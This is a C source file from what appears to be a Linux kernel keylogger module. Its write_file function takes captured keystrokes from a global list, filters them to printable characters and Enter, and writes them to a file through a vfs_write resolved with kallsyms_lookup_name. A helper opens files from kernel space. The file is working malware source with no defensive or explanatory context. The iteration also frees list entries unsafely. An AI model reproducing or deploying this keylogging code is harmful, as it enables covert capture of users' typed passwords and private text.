#include "keylog.h"

extern	struct list_head head_stroke_lst;

void write_file(struct file *filp)
{
	char			*output;
	struct s_stroke		*st = NULL;
	unsigned long long off = 0;
	mm_segment_t oldfs;
	int ret;
	int len;

	vfs_write_type	vfs_write =
		(void *)kallsyms_lookup_name("vfs_write");

	oldfs = get_fs();
	set_fs(get_ds());
	output = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (output) {
		memset(output, 0, PAGE_SIZE);
		list_for_each_entry_reverse(st, &head_stroke_lst, stroke_lst) {
			if (st->state == PRESSED && st->value != -1 &&
			    (isprint(st->value) || st->value == 13)) {
				len = strlen(output);
				if (len < PAGE_SIZE) {
					if (st->value == 13)
						output[len] = '\n';
					else
						output[len] = st->value;
				}
				if (len == PAGE_SIZE - 1) {
					ret = vfs_write(filp, output,
							strlen(output), &off);
					if (ret < 0) {
						pr_err("vfs_write");
					}
					memset(output, 0, PAGE_SIZE);
				}
			}
			kfree(st);
		}
		ret = vfs_write(filp, output, strlen(output), &off);
		if (ret < 0) {
			pr_err("vfs_write");
		}
	}
	set_fs(oldfs);
	filp_close(filp, NULL);
	kfree(output);
}
EXPORT_SYMBOL(write_file);

struct file *file_open(const char *path, int flags, int rights)
{
	struct file *filp = NULL;
	mm_segment_t oldfs;
	int err = 0;

	oldfs = get_fs();
	set_fs(get_ds());
	filp = filp_open(path, flags, rights);
	set_fs(oldfs);
	if (IS_ERR(filp)) {
		err = PTR_ERR(filp);
		return NULL;
	}
	return filp;
}
EXPORT_SYMBOL(file_open);
